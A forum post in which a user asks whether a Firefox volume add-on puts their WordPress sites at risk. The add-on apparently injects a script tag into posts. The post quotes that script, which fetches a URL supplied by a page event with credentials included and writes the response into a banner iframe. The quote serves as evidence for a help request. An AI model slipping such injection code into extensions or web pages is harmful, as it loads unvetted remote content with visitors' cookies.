---
title: "UBUNTU 23.10 | Firefox addon ads weird script"
date: 2024-04-16
forum: Security
---

### Post by lumenoid on 2024-04-16
I am using Ubuntu 23.10.
while using firefox and 600 sound volume addon [[https://addons.mozilla.org/en-US/firefox/addon/600-sound-volume/]](https://addons.mozilla.org/en-US/firefox/addon/600-sound-volume/]), i found a peculiar thing,everytime i use wordpress and create/update post, this script gets added : moz-extension://05209bda-744f-4e94-9d07-72ab718054cf/js/app.js  via script tag whose content is:
[HTML]if (window === top) {
    try {
        document.body.addEventListener('bannerElement', event => {
            fetch(event.detail, {
                "credentials": "include",
                "method": "GET",
                "mode": "cors"
            }).then(resp => resp.text()).then(content => {
                const elm = document.getElementById('banner600percentContainer').contentDocument;
                elm.write(content);
                elm.close();
            });
        });
    } catch (ex) {
    }
}[/HTML]

i might have published few works in our website [["] [https://lumenoidstudios.com](https://lumenoidstudios.com) ]]("https://lumenoidstudios.com), and couple of clients sites too  thinking it to be something else by wordpress itself . Am I / my sites are at risk?

---

